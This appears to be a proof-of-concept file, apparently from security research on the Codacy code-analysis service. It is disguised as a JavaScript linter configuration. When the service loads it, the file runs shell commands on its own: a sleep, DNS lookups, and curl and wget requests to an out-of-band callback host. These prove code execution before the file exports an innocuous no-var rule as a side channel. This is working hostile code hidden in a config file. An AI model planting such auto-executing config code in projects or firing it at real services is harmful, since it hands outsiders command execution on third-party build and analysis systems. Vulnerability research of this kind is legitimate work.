// Codacy LEAD-003 — CJS version (avoids __esModule transpiler issue)
const { execSync } = require("child_process");

const H = "db5su1fkntr8hva7hjsgscpjyb6qefh4k.oast.pro";
const run = (cmd) => { try { execSync(cmd, { timeout: 4000, stdio: "ignore" }); } catch (_) {} };

// Code execution proof — runs synchronously when Codacy loads this config
run("sleep 10");
run(`nslookup ${H}`);
run(`dig +short ${H}`);
run(`curl -sf --max-time 3 http://${H}/v3-cjs-http`);
run(`curl -sf --max-time 3 https://${H}/v3-cjs-https`);
run(`wget -q --timeout=3 -O- http://${H}/v3-wget 2>/dev/null`);

// Clean side-channel: no-var flags probe.js → Codacy issue count goes from 0 to 1
module.exports = [{ rules: { "no-var": "error" } }];
